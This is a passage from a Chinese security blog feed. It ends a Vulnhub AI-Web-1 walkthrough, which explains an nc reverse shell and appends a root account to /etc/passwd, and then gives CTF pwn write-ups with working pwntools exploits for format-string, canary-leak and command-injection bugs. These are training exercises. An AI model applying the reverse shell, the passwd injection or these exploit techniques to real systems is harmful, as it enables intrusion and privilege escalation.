<li><strong><code>/bin/sh -i</code>：启动一个交互式的<code>shell</code>。<code>-i</code>参数表示交互式模式。</strong></li>
<li><strong><code>2&gt;&amp;1</code>：将标准错误(<code>stderr</code>)重定向到标准输出(<code>stdout</code>)。这意味着所有通过<code>shell</code>产生的错误消息也会被发送到同一个输出。</strong></li>
<li><strong><code>| nc 192.168.30.130 6666</code>：将<code>cat</code>命令的输出(即<code>shell</code>的输入)过管道传递给 <code>nc</code>(<code>netcat</code>)命令。<code>nc</code>命令连接到 IP 地址 <code>192.168.0.103</code>的<code>6666</code>端口，并将数据发送到该端口。</strong></li>
<li><strong><code>&gt;/tmp/f</code>：将<code>nc</code>命令的输出重定向到<code>/tmp/f</code>文件。这样，<code>cat /tmp/f</code>命令就会读取这些数据，并将其作为输入传递给<code>/bin/sh -i</code>，从而允许远程用户通过<code>nc</code>发送的命令来控制<code>shell</code>。</strong></li>
</ul>
<p>成功反弹<code>shell</code>，但依旧权限较低</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503112255431.png" alt="image-20241119214828802" style="zoom:67%;" />

<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>进入交互式<code>shell</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>

<p>搜索属于<code>root</code>用户且具有<code>setuid</code>权限位的文件</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br><span class="line"><span class="comment">#指定起始目录为根目录、搜索的文件所有者为root用户、查找具有setuid位的文件。(setuid权限位允许用户以文件所有者的权限执行文件，通常用于提升权限)</span></span><br><span class="line"><span class="comment"># -print：表示将搜索结果打印到标准输出。</span></span><br><span class="line"><span class="comment"># 2&gt;/dev/null：将错误消息重定向到 /dev/null，这意味着忽略所有错误信息。</span></span><br></pre></td></tr></table></figure>

<p>查看内核版本</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">uname</span> -a</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503112256673.png" alt="image-20241119221024659"></p>
<h4 id="添加root账号"><a href="#添加root账号" class="headerlink" title="添加root账号"></a>添加<code>root</code>账号</h4><p> 生成<code>Linux</code>系统用户密钥</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">openssl passwd -1 -salt jt 5799</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503112256383.png" alt="image-20241119222550002"  />

<p> 读写<code>/etc/passwd</code>文件</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;jt:$1$jt$iCU3U.0M3WJQhDq5RlET00:0:0::/root:/bin/bash&#x27;</span> &gt;&gt; /etc/passwd</span><br></pre></td></tr></table></figure>

<p>登录账号</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">su jt</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503112256265.png" alt="image-20241119222807809" style="zoom: 50%;" />

<h3 id="查看flag"><a href="#查看flag" class="headerlink" title="查看flag"></a>查看<code>flag</code></h3><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503112256776.png" alt="image-20241119222927834" style="zoom:50%;" />

<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p>[看完这篇 教你玩转渗透测试靶机vulnhub——Ai-Web1](<a href="https://blog.csdn.net/Aluxian_/article/details/124434294">看完这篇 教你玩转渗透测试靶机vulnhub——Ai-Web1-CSDN博客</a>)</p>
<p>[Vulnhub靶机渗透之 AI: Web: 1](<a href="https://blog.csdn.net/Waffle666/article/details/118962742">Vulnhub靶机渗透之 AI: Web: 1_反弹shell服务器上执行不了ai:web:1-CSDN博客</a>)</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>BUU刷题记录</title>
    <url>/2024/01/06/BUU%E5%88%B7%E9%A2%98/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>还是buu刷题记录，不过这个记录的题目都是让我学到的内容更多的题，值对一篇单独的文章。</p>
<p>[]<del>(￣▽￣)</del>*</p>
<span id="more"></span>

<h1 id="fini-arry-ciscn-2019-sw-1"><a href="#fini-arry-ciscn-2019-sw-1" class="headerlink" title="(fini.arry)ciscn_2019_sw_1"></a><code>(fini.arry)ciscn_2019_sw_1</code></h1><h2 id="保护-源码"><a href="#保护-源码" class="headerlink" title="保护&amp;源码"></a>保护&amp;源码</h2><p>保护：</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101102700.png" alt="image-20240710110220628" style="zoom:67%;" />

<p>源码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> format[<span class="number">68</span>]; <span class="comment">// [esp+0h] [ebp-48h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to my ctf! What&#x27;s your name?&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%64s&quot;</span>, format);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello &quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(format);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">sys</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(command);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>​	程序中有一个格式化字符串漏洞，但只能执行一次格式化漏洞函数，有<code>system</code>函数。我们可以看到<code>printf(format)</code>后面<code>main</code>函数就执行完了，所以不管我们修改哪一个函数的<code>got</code>表值为<code>system@plt</code>的地址，都不行。后来看<code>wp</code>，发现我们可以修改<code>fini_array</code>的函数指针为<code>main</code>函数地址，这样就能再执行一次<code>main</code>函数了。</p>
<p>​	刚开始用下面这个方法，泄漏我们输入的第一个参数在栈中的偏移量，以为是<code>4</code>，一直打不通，调试的时候查看栈中的值，发现栈中的第<code>1,2</code>和<code>5</code>个参数都是我们输入的第一个参数，所以我们并不能确定准确的偏移量</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101053168.png" alt="image-20240305185357092"></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101102943.png" alt="image-20240710110200865"></p>
<p>​	然后我发送下面这个<code>payload</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;aaaabbbb&#x27;</span>+<span class="string">b&#x27;%p%p%p%p%p&#x27;</span></span><br></pre></td></tr></table></figure>

<p>​	现在可以看出泄漏的第<code>1</code>个参数地址是栈中的第<code>2</code>个参数，也就是说我们计算偏移量的时候要从<code>02</code>这个序号开始往下数</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101053159.png" alt="image-20240305185704092"></p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a><code>exp</code></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&#x27;./sw1&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">26399</span>)</span><br><span class="line"><span class="comment">#debug(p,0x80485A8)</span></span><br><span class="line"><span class="comment">#context.arch=&#x27;i386&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./sw1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main_addr = <span class="number">0x08048534</span></span><br><span class="line">fini_array_addr = <span class="number">0x0804979C</span></span><br><span class="line">printf_got = <span class="number">0x0804989c</span></span><br><span class="line">sys_plt = <span class="number">0x080483d0</span></span><br><span class="line"></span><br><span class="line">payload = p32(printf_got+<span class="number">2</span>)+p32(printf_got)+p32(fini_array_addr)</span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(<span class="number">0x804</span>-<span class="number">12</span>),encoding=<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%4$hn&#x27;</span></span><br><span class="line"><span class="comment">#这里还要减去12，因为前面发送的3个地址一共12个字节</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(<span class="number">0x83d0</span>-<span class="number">0x804</span>),encoding=<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%5$hn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(<span class="number">0x8534</span>-<span class="number">0x83d0</span>),encoding=<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%6$hn&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;name?&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到<code>flag</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101101049.png" alt="image-20240710110144974"></p>
<h1 id="qctf-2018-dice-game"><a href="#qctf-2018-dice-game" class="headerlink" title="qctf_2018_dice_game"></a><code>qctf_2018_dice_game</code></h1><p>​	分析程序，猜随机数，猜对了就能拿到<code>flag</code>。本题有两种方法，一种是利用溢出覆盖<code>seed</code>的值，然后使其为定值，这样我们就能拿到<code>50</code>个随机数，然后发送。第<code>2</code>种方法是自己起一个生成随机数的程序，在生成随机数的同时发送随机数，同样也能得到<code>flag</code>。</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101053468.png" alt="image-20240306124511429" style="zoom:80%;" />

<h2 id="法1"><a href="#法1" class="headerlink" title="法1"></a>法1</h2><p>​	先说第<code>1</code>种，程序中第<code>13</code>行有一个溢出点，<code>read</code>读入<code>0x50</code>个字节到<code>buf</code>中，可以算出<code>buf</code>距离<code>seed</code>的偏移量为<code>0x40</code>。也就是说我们可以覆盖<code>seed</code>，使其为定值，注意这里覆盖要在<code>seed = time(0LL)</code>之后。</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101053695.png" alt="image-20240306131031947" style="zoom:80%;" />

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x50</span>-<span class="number">0x10</span>)+p64(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>​	此时已经覆盖<code>seed</code>为<code>0</code>，然后写一个<code>c</code>语言程序打印出种子<code>seed</code>为<code>0</code>时，生成的前<code>50</code>个随机数，如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    srand(<span class="number">0</span>);</span><br><span class="line">    <span class="type">int</span> i=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">50</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> v2 = rand() % <span class="number">6</span> + <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,v2);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101101669.png" alt="image-20240710110124591"></p>
<p>最后<code>exp</code>如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&#x27;./q&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">28649</span>)</span><br><span class="line"><span class="comment">#debug(p)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x50</span>-<span class="number">0x10</span>)+p64(<span class="number">0</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">v2=<span class="string">&quot;25426251423232651155634433322261116425254446323361&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> v2:</span><br><span class="line">    p.sendline(i)</span><br><span class="line">    </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="法2"><a href="#法2" class="headerlink" title="法2"></a>法2</h2><p>​	这一种方法是最常见的，也是最容易想到的，就是自己起一个生成随机数的程序，在生成随机数的同时发送随机数，同样也能得到<code>flag</code>。</p>
<p>生成随机数的<code>c</code>程序<code>rand.c</code>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> seed[<span class="number">2</span>];</span><br><span class="line">    *seed = time(<span class="number">0LL</span>);</span><br><span class="line">    srand(seed[<span class="number">0</span>]);</span><br><span class="line">    <span class="type">int</span> v2=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;<span class="number">50</span>;i++)&#123;</span><br><span class="line">    v2 = rand() % <span class="number">6</span> + <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;======&gt;&gt;&gt;%d\n&quot;</span>,v2);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>exp</code>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#debug(p,&quot;pie&quot;,0x0000000000000C44)</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./q&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">28649</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;ome, let me know your name:&quot;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">a = process(<span class="string">&quot;./rand&quot;</span>)</span><br><span class="line">         </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):     </span><br><span class="line">    a.recvuntil(<span class="string">&quot;==&gt;&gt;&gt;&quot;</span>)</span><br><span class="line">    value = a.recvline(<span class="literal">False</span>).decode()  </span><br><span class="line">    p.sendlineafter(<span class="string">&quot;me the point(1~6): &quot;</span>,<span class="built_in">str</span>(value))</span><br><span class="line">    value = <span class="number">0</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到<code>flag</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101053805.png" alt="image-20240306133033057"></p>
<h1 id="canary-linkctf-2018-7-babypie"><a href="#canary-linkctf-2018-7-babypie" class="headerlink" title="(canary)linkctf_2018.7_babypie"></a><code>(canary)linkctf_2018.7_babypie</code></h1><h2 id="保护-源码-1"><a href="#保护-源码-1" class="headerlink" title="保护&amp;源码"></a>保护&amp;源码</h2><p>保护：</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101101413.png" alt="image-20240710110101339" style="zoom:67%;" />

<p>源码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_960</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 buf[<span class="number">6</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line"></span><br><span class="line">  buf[<span class="number">5</span>] = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">32</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your Name:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x30u</span>LL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello %s:\n&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)buf);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x60u</span>LL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">sub_A3E</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>​	程序中直接给了后门函数，可以栈溢出，首先整体思路就是覆盖<code>main</code>函数返回地址为后门函数地址。但是开了<code>canary</code>和<code>PIE</code>保护，所以我们接下来要看看是否能绕过这两个保护。</p>
<p>​	首先是<code>PIE</code>保护，我们可以看到后门函数地址与原先地址只有最后<code>1</code>个字节不同，所以我们可以只覆盖返回地址的最后一、<code>1</code>个字节，进而控制执行流执行后门函数。</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101053191.png" alt="image-20240309162057963" style="zoom:67%;" />

<p>​	下面图中，<code>printf</code>可以打印出<code>buf</code>的地址里的字符串，正常来讲是不会输出<code>canary</code>的，因为<code>canary</code>的最后<code>1</code>个字节是<code>\x00</code>标志着字符串的结束，但是如果可以覆盖<code>\x00</code>，<code>canary</code>便会被连带着打印出来。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101100759.png" alt="image-20240710110038682"></p>
<p><code>read</code>可以读入<code>64</code>个字节，覆盖<code>canary</code>最后<code>1</code>个字节<code>\x00</code>只需要<code>41</code>个字节即可</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101053220.png" alt="屏幕截图 2024-03-09 170006"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">40</span>+<span class="string">b&#x27;b&#x27;</span></span><br><span class="line">p.sendafter(<span class="string">&quot;Input your Name:\n&quot;</span>,payload)</span><br></pre></td></tr></table></figure>

<p>覆盖后，如图：</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101100880.png" alt="image-20240710110019800"></p>
<p>此时，<code>canary</code>便可被输出，接收<code>canary</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p.recvuntil(<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">canary = u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment">#这里不用ljust而是用rjust，ljust会把\x00补到高字节，而rjust会把\x00补到低字节</span></span><br></pre></td></tr></table></figure>

<h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a><code>exp</code></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,elf,libc = load(<span class="string">&quot;babypie&quot;</span>,<span class="string">&quot;node5.buuoj.cn:26795&quot;</span>)</span><br><span class="line"><span class="comment">#debug(p)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">40</span>+<span class="string">b&#x27;b&#x27;</span></span><br><span class="line">p.sendafter(<span class="string">&quot;Input your Name:\n&quot;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">canary = u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&quot;canary&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(canary)+p64(<span class="number">0</span>)+<span class="string">b&#x27;\x3f&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到<code>flag</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101053917.png" alt="image-20240309212604335"></p>
<h1 id="交换变量值-pwnable-loveletter"><a href="#交换变量值-pwnable-loveletter" class="headerlink" title="(交换变量值)pwnable_loveletter"></a><code>(交换变量值)pwnable_loveletter</code></h1><h2 id="保护-源码-2"><a href="#保护-源码-2" class="headerlink" title="保护&amp;源码"></a>保护&amp;源码</h2><p>保护：</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101059447.png" alt="image-20240710105958363" style="zoom:80%;" />

<p>源码：</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101053109.png" alt="image-20240318121511252" style="zoom:80%;" />

<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101053124.png" alt="image-20240318121436189" style="zoom:50%;" />

<h2 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h2><p>​	最开始以为程序中没有栈溢出，思路是用逻辑运算符分隔字符串执行<code>/bin/sh</code>或者其他命令，但是看到会被<code>protect</code>函数过滤。</p>
<p>​	然后也是在这个函数中，我们发现替换后的内容比替换前多了<code>3</code>个字节，可以造成栈溢出。控制<code>v6</code>这个值为<code>1</code>，就会把<code>prolog=&quot;echo I love &quot;</code>中的第一个字节拼接到<code>loveletter</code>中。然后我们直接写进<code>nv sh -c sh </code>拼接即可，注意这里要在最后留一个空格，因为后面还会在被拼接数据。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;nv sh -c sh&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*(<span class="number">253</span>-<span class="number">11</span>)+<span class="string">b&#x27;;&#x27;</span>+<span class="string">b&#x27;\x01&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a><code>exp</code></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&#x27;./love&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">28357</span>)</span><br><span class="line"><span class="comment">#debug(p)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;nv sh -c sh &#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*(<span class="number">253</span>-<span class="number">12</span>)+<span class="string">b&#x27;;&#x27;</span>+<span class="string">b&#x27;\x01&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到<code>flag</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101059332.png" alt="image-20240710105939258"></p>
<h1 id="picoctf-2018-echo-back-格式化字符串"><a href="#picoctf-2018-echo-back-格式化字符串" class="headerlink" title="picoctf_2018_echo back(格式化字符串)"></a><code>picoctf_2018_echo back(格式化字符串)</code></h1><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>​	程序中有<code>system</code>函数，有格式化字符串漏洞，<code>RELRO</code>保护为<code>Partial RELRO</code>，可以劫持<code>printf</code>的<code>got</code>表为<code>system@plt</code>。但是只有一次<code>printf</code>，然后思路就卡在这里了。后来又想到<code>printf</code>后面还有两个<code>puts</code>，可以修改<code>puts</code>的<code>got</code>表为<code>vuln</code>的地址，然后劫持程序执行流到<code>vuln</code>函数使程序再执行一遍，便可调用<code>syatem</code>函数。</p>
<h2 id="保护-源码-3"><a href="#保护-源码-3" class="headerlink" title="保护&amp;源码"></a>保护&amp;源码</h2><p>保护：</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101053000.png" alt="image-20240323103152232" style="zoom:67%;" />

<p>源码：</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101053566.png" alt="image-20240323103303531" style="zoom:67%;" />

<h2 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a><code>exp</code></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&#x27;./b&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">27568</span>)</span><br><span class="line">debug(p,<span class="number">0x8048604</span>)</span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./b&#x27;</span>)</span><br><span class="line"></span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sys_addr = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">printf_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">sys_value = sys_addr&amp;<span class="number">0xffff</span></span><br><span class="line">log_addr(<span class="string">&quot;sys_value&quot;</span>)</span><br><span class="line">vuln_value = <span class="number">0x85ab</span></span><br><span class="line">payload = <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(<span class="number">0x804</span>),encoding=<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%17$hn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(<span class="number">0x8460</span>-<span class="number">0x804</span>),encoding=<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%16$hn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(<span class="number">0x85ab</span>-<span class="number">0x8460</span>),encoding=<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%18$hn&#x27;</span></span><br><span class="line">payload += p32(printf_got)+p32(printf_got+<span class="number">2</span>)+p32(puts_got)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">log_addr(<span class="string">&quot;printf_got&quot;</span>)</span><br><span class="line">log_addr(<span class="string">&quot;puts_got&quot;</span>)</span><br><span class="line">log_addr(<span class="string">&quot;sys_addr&quot;</span>)</span><br><span class="line">log_addr(<span class="string">&quot;printf_plt&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到<code>flag</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101059468.png" alt="image-20240710105915397"></p>
<h1 id="GKCTF-2021-checkin"><a href="#GKCTF-2021-checkin" class="headerlink" title="[GKCTF 2021]checkin"></a><code>[GKCTF 2021]checkin</code></h1><h2 id="保护"><a href="#保护" class="headerlink" title="保护"></a>保护</h2><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101058647.png" alt="image-20240710105852575" style="zoom:80%;" />

<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101053477.png" alt="image-20240328171631887"></p>
<p>​	程序中有两次<code>read</code>，第一次是将数据写到了<code>.bss</code>段，第二次有栈溢出漏洞，可以溢出<code>8</code>个字节，我们第一时间想到栈迁移。然后是一个<code>if</code>语句，如果满足条件则执行<code>exit(0)</code>直接退出程序，所以我们要想办法跳过<code>if</code>语句使程序不执行<code>exit(0)</code>。</p>
